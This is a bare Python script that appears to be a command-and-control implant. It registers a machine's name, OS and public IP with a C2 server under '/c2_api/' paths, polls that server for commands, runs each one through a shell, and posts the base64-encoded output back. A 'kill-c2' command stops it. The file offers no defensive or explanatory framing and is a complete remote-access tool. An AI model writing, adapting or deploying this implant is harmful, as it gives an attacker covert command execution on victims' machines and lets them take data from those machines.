import requests  
import json
import subprocess
import base64
import time
import platform

base_url = "http://127.0.0.1:8000"
listener_id = "<listener-id>"
machine_name = platform.node()
machine_type = platform.system()
ip_address = requests.get("https://ifconfig.me").text.strip()
json_file = "data.json"
output_file = "output.txt"


def get_machine_id():
    try:
        with open(json_file, "r") as file:
            data = json.load(file)
            return data.get("machine_id", None)
    except (FileNotFoundError, json.JSONDecodeError, KeyError):
        return None


machine_id = get_machine_id()

json_data = {
    "machine_id": machine_id,
    "machine_name": machine_name,
    "machine_type": machine_type,
    "ip_address": ip_address,
    "listener_id": listener_id,
}


def update_json_file():
    try:
        with open(json_file, "r") as file:
            existing_data = json.load(file)

        if any(
            existing_data.get(key) != json_data[key]
            for key in json_data
            if key != "machine_id"
        ):
            with open(json_file, "w") as file:
                json.dump(json_data, file, indent=2)
    except (FileNotFoundError, json.JSONDecodeError, KeyError):
        with open(json_file, "w") as file:
            json.dump(json_data, file, indent=2)


def connect_to_server():
    while True:
        try:
            response = requests.post(
                f"{base_url}/c2_api/connection/update/{machine_id}/", json=json_data
            )
            update_json_file()
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print("Retrying in 5 seconds...")
            time.sleep(3)


if not machine_id:
    response = requests.post(f"{base_url}/c2_api/connection/create/", json=json_data)
    response_data = response.json()
    machine_id = response_data.get("machine_id")
    json_data["machine_id"] = machine_id
    update_json_file()
else:
    response = connect_to_server()


while True:
    try:
        json_output = requests.post(
            f"{base_url}/c2_api/connection/manage/{machine_id}/",
            json={"machine_id": machine_id},
        ).json()
        command = json_output.get("command")

        if command == "kill-c2":
            break

        if command:
            try:
                result = subprocess.check_output(
                    command, shell=True, stderr=subprocess.STDOUT, text=True
                )
                with open(output_file, "w") as outfile:
                    outfile.write(result)
                base64_output = base64.b64encode(
                    result.encode() if isinstance(result, str) else result
                ).decode()
            except subprocess.CalledProcessError as e:
                with open(output_file, "w") as outfile:
                    outfile.write(str(e.output))
                base64_output = base64.b64encode(str(e.output).encode()).decode()
        else:
            base64_output = ""

        json_output = {
            "machine_id": machine_id,
            "command": command,
            "output": base64_output,
        }

        if json_output.get("command"):
            print(json_output)

        response = requests.post(
            f"{base_url}/c2_api/connection/manage/{machine_id}/", json=json_output
        )
        response.raise_for_status()
        time.sleep(3)
    except requests.exceptions.RequestException as e:
        print("Retrying in 5 seconds...")
        time.sleep(3)
